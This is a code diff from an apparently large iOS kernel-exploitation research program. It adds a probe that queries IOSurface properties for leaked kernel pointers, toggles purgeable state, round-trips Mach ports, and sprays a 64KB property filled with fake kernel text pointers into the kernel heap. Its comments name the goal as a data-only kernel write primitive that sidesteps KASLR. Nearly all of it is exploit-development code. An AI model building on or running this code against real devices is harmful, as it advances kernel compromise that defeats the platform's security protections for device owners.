@@ -15902,6 +15902,221 @@ static void r362_probe(void) {
     fflush(stdout);
 }
 
+/* r391: IOSurface special property names + kernel config probing.
+ * Try setting properties with names that might have special kernel meaning.
+ * Also try: IOSurfaceSetPurgeable, IOSurfaceSetCompletionNotify,
+ * and other APIs that might create kernel-side state we can manipulate.
+ *
+ * Key new idea: Instead of KASLR bypass, try a DATA-ONLY exploit:
+ * 1. Find an IOSurface property or config that affects kernel behavior
+ * 2. Manipulate it to get a kernel write primitive without knowing addresses
+ * 3. Use relative writes or known-offset structures
+ */
+static void r391_probe(void) {
+    rlog("\n=== r391: IOSurface Special Properties + Data-Only Primitives ===\n\n");
+    fflush(stdout);
+
+    int w=64, h=64, bpe=4, bpr=64*4, pf=0x42475241, as_=64*64*4;
+    CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFNumberRef nW = CFNumberCreate(NULL, kCFNumberIntType, &w);
+    CFNumberRef nH = CFNumberCreate(NULL, kCFNumberIntType, &h);
+    CFNumberRef nB = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+    CFNumberRef nR = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+    CFNumberRef nP = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+    CFNumberRef nA = CFNumberCreate(NULL, kCFNumberIntType, &as_);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), nW);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), nH);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), nB);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), nR);
+    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), nP);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), nA);
+
+    IOSurfaceRef surf = IOSurfaceCreate(props);
+    uint32_t sid = IOSurfaceGetID(surf);
+    rlog("  Surface: sid=%u ptr=%p\n\n", sid, surf);
+
+    /* Phase 1: Try setting/getting internal kernel property names */
+    rlog("  Phase 1: Special property names\n");
+    const char *specialProps[] = {
+        "IOSurfaceAddress", "IOSurfaceKernelAddress", "IOSurfacePhysicalAddress",
+        "IOSurfaceOffset", "IOSurfaceBaseOffset", "IOSurfaceRegistryEntryID",
+        "IOSurfaceGlobalID", "IOSurfaceUseCount", "IOSurfaceInUse",
+        "IOSurfaceIsCompressed", "IOSurfaceCompressed", "IOSurfacePurgeable",
+        "IOSurfaceProtectionOptions", "IOSurfaceCacheMode", "IOSurfaceMemoryRegion",
+        "IOSurfaceMapCacheMode", "IOSurfaceIsGlobal", "IOSurfaceCreatorPID",
+        "IOSurfaceOwnerPID", "IOSurfaceClientCount", "IOSurfaceKernelUseCount",
+        "IOSurfaceShared", "IOSurfaceRemote", "IOSurfaceSecure",
+        "SurfaceID", "SID", "KernelPtr", "PhysAddr", "BackingStore",
+        "IOSurfaceMachPort", "IOSurfaceNotifyPort",
+    };
+    for (int i = 0; i < (int)(sizeof(specialProps)/sizeof(specialProps[0])); i++) {
+        CFStringRef key = CFStringCreateWithCString(NULL, specialProps[i], kCFStringEncodingUTF8);
+        CFTypeRef val = IOSurfaceCopyValue(surf, key);
+        if (val) {
+            CFTypeID tid = CFGetTypeID(val);
+            if (tid == CFNumberGetTypeID()) {
+                int64_t v = 0;
+                CFNumberGetValue((CFNumberRef)val, kCFNumberSInt64Type, &v);
+                rlog("    %s: %lld (0x%llx)\n", specialProps[i], (long long)v, (unsigned long long)v);
+                if (((uint64_t)v & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL) {
+                    rlog("      *** KERNEL POINTER FOUND! ***\n");
+                }
+            } else if (tid == CFDataGetTypeID()) {
+                CFIndex dl = CFDataGetLength((CFDataRef)val);
+                const uint8_t *d = CFDataGetBytePtr((CFDataRef)val);
+                rlog("    %s: (data, %ld bytes)", specialProps[i], (long)dl);
+                for (CFIndex j = 0; j < dl && j < 32; j++) rlog(" %02x", d[j]);
+                rlog("\n");
+            } else {
+                rlog("    %s: (type=%lu)\n", specialProps[i], (unsigned long)tid);
+            }
+            CFRelease(val);
+        }
+        CFRelease(key);
+    }
+
+    /* Phase 2: Try IOSurface purgeable state APIs */
+    rlog("\n  Phase 2: Purgeable state\n");
+    uint32_t (*setPurgeable)(IOSurfaceRef, uint32_t, uint32_t*) =
+        dlsym(RTLD_DEFAULT, "IOSurfaceSetPurgeable");
+    rlog("    IOSurfaceSetPurgeable: %p\n", setPurgeable);
+    if (setPurgeable) {
+        uint32_t oldState = 0;
+        /* 0=non-volatile, 1=volatile, 2=empty, 3=keep current */
+        uint32_t kr = setPurgeable(surf, 1, &oldState); /* make volatile */
+        rlog("    Set volatile: kr=%u oldState=%u\n", kr, oldState);
+        kr = setPurgeable(surf, 0, &oldState); /* make non-volatile */
+        rlog("    Set non-volatile: kr=%u oldState=%u\n", kr, oldState);
+    }
+
+    /* Phase 3: Try IOSurfaceCreateMachPort with receive rights */
+    rlog("\n  Phase 3: Mach port manipulation\n");
+    mach_port_t (*createMP)(IOSurfaceRef) = dlsym(RTLD_DEFAULT, "IOSurfaceCreateMachPort");
+    if (createMP) {
+        mach_port_t mp1 = createMP(surf);
+        mach_port_t mp2 = createMP(surf);
+        rlog("    Two Mach ports for same surface: 0x%x, 0x%x\n", mp1, mp2);
+
+        /* Try to insert a send right into another port */
+        mach_port_t bootstrap = 0;
+        kern_return_t kr = task_get_special_port(mach_task_self(), TASK_BOOTSTRAP_PORT, &bootstrap);
+        rlog("    Bootstrap port: kr=0x%x port=0x%x\n", kr, bootstrap);
+
+        /* Create a new surface from the Mach port to test round-trip */
+        IOSurfaceRef (*lookupMP)(mach_port_t) = dlsym(RTLD_DEFAULT, "IOSurfaceLookupFromMachPort");
+        if (lookupMP) {
+            IOSurfaceRef rt = lookupMP(mp1);
+            rlog("    Round-trip from port: %p (orig=%p)\n", rt, surf);
+            if (rt) {
+                /* Set property through original, read through round-trip */
+                int mark = 0xBEEF391;
+                CFNumberRef mv = CFNumberCreate(NULL, kCFNumberIntType, &mark);
+                IOSurfaceSetValue(surf, CFSTR("RTTest"), mv);
+                CFRelease(mv);
+
+                CFTypeRef rv = IOSurfaceCopyValue(rt, CFSTR("RTTest"));
+                if (rv) {
+                    int v = 0;
+                    CFNumberGetValue((CFNumberRef)rv, kCFNumberIntType, &v);
+                    rlog("    Property round-trip: 0x%x (expect 0xBEEF391)\n", v);
+                    CFRelease(rv);
+                }
+                CFRelease(rt);
+            }
+        }
+
+        if (mp1) mach_port_deallocate(mach_task_self(), mp1);
+        if (mp2) mach_port_deallocate(mach_task_self(), mp2);
+    }
+
+    /* Phase 4: Try IOSurface with VERY large property data */
+    rlog("\n  Phase 4: Large property data (kernel heap spray test)\n");
+    /* Set a large property (64KB) to see if it creates a contiguous kernel allocation */
+    size_t bigsize = 65536;
+    uint8_t *bigdata = calloc(1, bigsize);
+    /* Fill with a pattern that includes a fake kernel pointer */
+    for (size_t i = 0; i < bigsize; i += 8) {
+        uint64_t pattern = 0xFFFFFFF007004000ULL + i; /* fake ktext range */
+        memcpy(bigdata + i, &pattern, 8);
+    }
+    CFDataRef bigcf = CFDataCreate(NULL, bigdata, bigsize);
+    IOSurfaceSetValue(surf, CFSTR("BigProp"), bigcf);
+    CFRelease(bigcf);
+
+    /* Read it back to verify kernel stored it */
+    CFTypeRef bigback = IOSurfaceCopyValue(surf, CFSTR("BigProp"));
+    if (bigback && CFGetTypeID(bigback) == CFDataGetTypeID()) {
+        CFIndex len = CFDataGetLength((CFDataRef)bigback);
+        rlog("    BigProp stored: %ld bytes (sent %zu)\n", (long)len, bigsize);
+        /* Check first few bytes match */
+        const uint8_t *d = CFDataGetBytePtr((CFDataRef)bigback);
+        uint64_t first;
+        memcpy(&first, d, 8);
+        rlog("    First 8 bytes: 0x%016llx (expect 0xFFFFFFF007004000)\n", (unsigned long long)first);
+        CFRelease(bigback);
+    }
+    free(bigdata);
+
+    /* Phase 5: Create surface with kernel-range values in creation props */
+    rlog("\n  Phase 5: Surface creation with extreme parameters\n");
+    CFMutableDictionaryRef eprops = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    int ew = 1, eh = 1, ebpe = 4, ebpr = 4;
+    int64_t eas = 0x100000; /* 1MB */
+    CFNumberRef new_ = CFNumberCreate(NULL, kCFNumberIntType, &ew);
+    CFNumberRef neh = CFNumberCreate(NULL, kCFNumberIntType, &eh);
+    CFNumberRef nebpe = CFNumberCreate(NULL, kCFNumberIntType, &ebpe);
+    CFNumberRef nebpr = CFNumberCreate(NULL, kCFNumberIntType, &ebpr);
+    CFNumberRef neas = CFNumberCreate(NULL, kCFNumberSInt64Type, &eas);
+    CFNumberRef nepf = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+    CFDictionarySetValue(eprops, CFSTR("IOSurfaceWidth"), new_);
+    CFDictionarySetValue(eprops, CFSTR("IOSurfaceHeight"), neh);
+    CFDictionarySetValue(eprops, CFSTR("IOSurfaceBytesPerElement"), nebpe);
+    CFDictionarySetValue(eprops, CFSTR("IOSurfaceBytesPerRow"), nebpr);
+    CFDictionarySetValue(eprops, CFSTR("IOSurfacePixelFormat"), nepf);
+    CFDictionarySetValue(eprops, CFSTR("IOSurfaceAllocSize"), neas);
+
+    /* Add extra properties during creation */
+    int64_t cacheMode = 0;
+    CFNumberRef ncm = CFNumberCreate(NULL, kCFNumberSInt64Type, &cacheMode);
+    CFDictionarySetValue(eprops, CFSTR("IOSurfaceCacheMode"), ncm);
+    CFRelease(ncm);
+
+    IOSurfaceRef esurf = IOSurfaceCreate(eprops);
+    if (esurf) {
+        rlog("    Extreme surface: sid=%u size=%zu\n",
+            IOSurfaceGetID(esurf), IOSurfaceGetAllocSize(esurf));
+
+        /* Check if CacheMode was accepted */
+        CFTypeRef cm = IOSurfaceCopyValue(esurf, CFSTR("IOSurfaceCacheMode"));
+        if (cm) {
+            int64_t v = 0;
+            CFNumberGetValue((CFNumberRef)cm, kCFNumberSInt64Type, &v);
+            rlog("    CacheMode read back: %lld\n", (long long)v);
+            CFRelease(cm);
+        } else {
+            rlog("    CacheMode: not stored\n");
+        }
+
+        CFRelease(esurf);
+    } else {
+        rlog("    Extreme surface creation FAILED\n");
+    }
+
+    CFRelease(eprops);
+    CFRelease(new_); CFRelease(neh); CFRelease(nebpe); CFRelease(nebpr);
+    CFRelease(neas); CFRelease(nepf);
+
+    /* Cleanup */
+    CFRelease(surf);
+    CFRelease(props);
+    CFRelease(nW); CFRelease(nH); CFRelease(nB); CFRelease(nR); CFRelease(nP); CFRelease(nA);
+
+    rlog("\n=== r391 complete ===\n");
+    fflush(stdout);
+}
+
 /* r390: Collect many object_ids to analyze kernel heap layout.
  * object_id from mach_vm_region_recurse is kernel-sourced.
  * On older iOS, it was derived from vm_object_t (truncated pointer).
@@ -60905,6 +61120,13 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 394) {
+            rlog("*** rounds=394: IOSurface Special Properties + Data-Only ***\n");
+            rlog("  Special property names, purgeable, large data spray.\n\n");
+            fflush(stdout);
+            r391_probe();
+            goto done;
+        }
         if (rounds == 393) {
             rlog("*** rounds=393: VM Object ID Collection + Heap Analysis ***\n");
             rlog("  Collect object_ids from many surfaces and VM regions.\n\n");
@@ -63248,7 +63470,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
